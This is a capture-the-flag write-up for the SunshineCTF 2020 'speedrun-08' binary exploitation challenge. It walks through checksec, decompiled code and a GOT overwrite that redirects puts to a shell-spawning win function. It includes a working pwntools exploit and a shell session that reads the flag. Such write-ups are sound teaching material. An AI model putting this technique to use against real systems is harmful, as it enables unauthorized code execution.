# **speedrun-08**
## Task
nc chal.2020.sunshinectf.org 30008
File: chall_08
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
* No canary assume BOF
* No PIE assume ROP
* System 64 bit

### Decompile with ghidra
```c
void main(void)
{
  undefined8 local_18;
  int local_c;
  
  __isoc99_scanf(&DAT_0040066c,&local_c);
  __isoc99_scanf(&DAT_0040066f,&local_18);
  *(undefined8 *)(target + (long)local_c * 8) = local_18;
  puts("hi");
  return;
}

void win(void)
{
  system("/bin/sh");
  return;
}
```
With the decompile code, `*(undefined8 *)(target + (long)local_c * 8) = local_18;` is a pointer which is pointing to some address and adjust that address's value

No PIE, then we think overwrite the function with `win`, So target is `puts`. Set the modifying pointer to the `puts` address then overwrite with `win` address
### Exploit
```python
from pwn import *

binary = context.binary = ELF('./chall_08')
p = remote('chal.2020.sunshinectf.org',30008)
p.sendline(str((binary.got.puts-binary.sym.target)//8))
p.sendline(str(binary.sym.win))
p.interactive()
```
### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_08'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30008: Done
[*] Switching to interactive mode
$ ls
chall_08
flag.txt
$ cat flag.txt
sun{fiction-fa1a28a3ce2fdd96}
```